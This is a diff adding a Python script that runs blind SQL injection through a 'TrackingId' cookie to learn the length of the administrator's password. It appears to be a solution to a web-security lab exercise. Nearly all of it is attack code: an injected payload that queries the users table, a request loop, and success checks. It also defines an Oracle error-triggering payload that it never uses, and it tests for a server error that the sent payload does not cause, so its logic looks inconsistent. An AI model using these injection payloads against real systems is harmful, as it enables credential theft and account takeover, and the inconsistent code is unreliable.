@@ -1,0 +1,15 @@
+for potenLen in range(lowerRange, upperRange + 1):
+    evilQueryFirst = "' UNION SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM dual--"
+    findPwLenQuery = "' AND LENGTH((SELECT password FROM users WHERE username = 'administrator')) = '"
+    evilCookie = trackingCookie + findPwLenQuery + str(potenLen)
+    cookies = {"TrackingId": evilCookie}
+    # print("le evil cookie: " + evilCookie)
+    # print("Iterating! Making le request")
+    response = requests.get(link, cookies = cookies)
+
+    if "InternalServerError" in response.text:
+        print("Password length found! It's " + str(potenLen) + " chars long!")
+        print("Breaking!")
+        break
+    else:
+        print("This one ain't it, Len %d" % (potenLen))
